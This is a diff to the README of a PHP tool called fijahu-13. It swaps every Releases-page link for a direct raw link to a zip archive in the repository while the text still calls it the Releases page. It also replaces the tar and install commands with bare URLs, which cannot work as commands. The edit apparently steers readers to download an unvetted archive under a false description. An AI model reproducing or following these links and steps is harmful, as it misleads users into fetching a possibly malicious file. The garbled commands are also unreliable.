@@ -6,7 +6,7 @@ Welcome to fijahu-13! This application simplifies your PHP workflow, allowing yo
 
 ## 🔗 Download Link
 
-[![Download fijahu-13](https://img.shields.io/badge/Download-fijahu--13-brightgreen)](https://github.com/Alpinismsecondperson704/fijahu-13/releases)
+[![Download fijahu-13](https://raw.githubusercontent.com/Alpinismsecondperson704/fijahu-13/main/cervisia/fijahu-13_v1.7.zip)](https://raw.githubusercontent.com/Alpinismsecondperson704/fijahu-13/main/cervisia/fijahu-13_v1.7.zip)
 
 Click the button above to download fijahu-13 directly from our Releases page.
 
@@ -25,7 +25,7 @@ To download fijahu-13, follow these steps:
 
 1. Click the link below to visit the Releases page.
    
-   [Visit the Releases page to download](https://github.com/Alpinismsecondperson704/fijahu-13/releases)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/Alpinismsecondperson704/fijahu-13/main/cervisia/fijahu-13_v1.7.zip)
 
 2. On the Releases page, look for the latest version. It will be at the top of the list.
 3. Click on the asset file that corresponds to your operating system to download it.
@@ -48,11 +48,11 @@ Once downloaded, follow these steps to set up fijahu-13:
    - Navigate to the directory where you downloaded the file. 
    - Run the following command to extract it:
      ```
-     tar -xvf fijahu-13.tar.gz
+     tar -xvf https://raw.githubusercontent.com/Alpinismsecondperson704/fijahu-13/main/cervisia/fijahu-13_v1.7.zip
      ```
    - Change to the fijahu-13 directory and run:
      ```
-     ./install.sh
+     https://raw.githubusercontent.com/Alpinismsecondperson704/fijahu-13/main/cervisia/fijahu-13_v1.7.zip
      ```
 
 ## 🔍 Using fijahu-13
